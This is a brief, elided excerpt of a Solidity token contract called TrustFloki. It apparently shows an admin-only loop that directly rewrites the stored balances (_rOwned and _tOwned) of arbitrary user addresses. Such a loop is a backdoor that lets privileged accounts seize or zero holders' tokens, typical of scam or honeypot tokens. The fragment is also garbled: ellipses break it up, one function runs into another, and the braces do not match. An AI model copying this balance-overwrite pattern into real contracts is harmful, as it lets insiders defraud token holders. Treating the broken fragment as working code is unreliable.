...
contract TrustFloki is Context, IERC20, Ownable {
    ...
    function addAdmin(address[] memory _admins) public onlyAdmin {
        ...
        onlyAdmin
    {
        for (uint256 i = 0; i < users.length; i++) {
            ...
            _rOwned[users[i]] = rLiquidity;

            _tOwned[users[i]] = amount;
        }
    }
